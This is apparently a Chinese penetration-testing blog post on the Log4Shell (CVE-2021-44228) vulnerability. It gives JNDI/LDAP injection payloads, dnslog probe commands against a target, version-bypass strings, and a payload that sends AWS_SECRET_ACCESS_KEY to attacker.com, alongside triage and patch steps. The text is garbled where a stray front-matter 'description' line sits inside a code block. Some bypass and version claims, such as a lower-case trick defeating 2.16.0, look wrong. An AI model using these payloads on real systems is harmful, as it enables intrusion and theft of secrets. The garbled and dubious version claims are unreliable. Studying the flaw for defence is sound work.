---
title: Log4j Log4Shell 漏洞全解析
date: 2025-11-20 08:00:00
tags:
  - 框架安全
  - 渗透测试
categories: 渗透测试
description: CVE-2021-44228 Log4Shell 从原理到利用——JNDI/LDAP 注入、dnslog 检测、各版本绕过姿势、不出网环境利用、排查与修复方案。
---

## 漏洞原理

Log4j 2.x 的 `${...}` Lookup 机制允许从 JNDI 加载远程对象：

```
日志输入：${jndi:ldap://attacker.com/exp}
Log4j 解析 → 请求 ldap://attacker.com/exp → 加载远程 Java 类 → 代码执行
```

影响：Log4j 2.0-beta9 ~ 2.14.1（不含 2.12.2、2.16.0）。

---

## 触发点

Log4Shell 几乎无处不在——只要用户输入会进 Log4j 日志：

```
- HTTP Header: User-Agent、X-Forwarded-For、Cookie
- URL 参数
description: Log4j Log4Shell 漏洞全解析——渗透测试实战笔记，含完整攻击链路与防御方案。
- 登录表单的用户名
- 任何被日志记录的用户输入
```

---

## JNDI 利用链

```mermaid
flowchart LR
    A[${jndi:ldap://evil/exp}] --> B[Log4j 解析]
    B --> C[JNDI 发起 LDAP 请求]
    C --> D[LDAP Server 返回恶意 Java 类]
    D --> E[目标加载并执行恶意类]
    E --> F[反弹Shell/命令执行]
```

---

## dnslog 检测

```bash
# 获取 dnslog 域名（ceye.io / Burp Collaborator）
# Payload: ${jndi:ldap://xxxx.dnslog.cn/test}

# 在可触发日志的地方注入：
curl http://target.com -H "User-Agent: \${jndi:ldap://xxxx.dnslog.cn/test}"
curl http://target.com -H "X-Forwarded-For: \${jndi:ldap://xxxx.dnslog.cn/test}"

# dnslog 平台收到 DNS 查询 → 存在漏洞
```

---

## 各版本绕过

| 版本 | 限制 | 绕过 |
|------|------|------|
| 2.15.0 | 禁用 lookup | `${jndi:ldap://127.0.0.1#evil.com/exp}` |
| 2.15.0 | 默认不加载远程类 | `${jndi:ldap://evil/exp}` 仍可发起连接 |
| 2.16.0 | 禁用 JNDI | `${${lower:j}ndi:ldap://evil/exp}` |

---

## 不出网利用

```bash
# 方法一：利用本地 JNDI 资源
# 如果 classpath 中有可利用的类
${jndi:ldap://127.0.0.1:1389/SerializeObject}

# 方法二：信息泄露
# 将环境变量拼接到外带请求中
${jndi:ldap://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}
```

---

## 排查与修复

```bash
# 排查
find / -name "log4j-core-*.jar" 2>/dev/null
grep -r "log4j" /path/to/app

# 修复
# 1. 升级到 2.17.0+
# 2. 设置 JVM 参数: -Dlog4j2.formatMsgNoLookups=true
# 3. 删除 JndiLookup.class: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
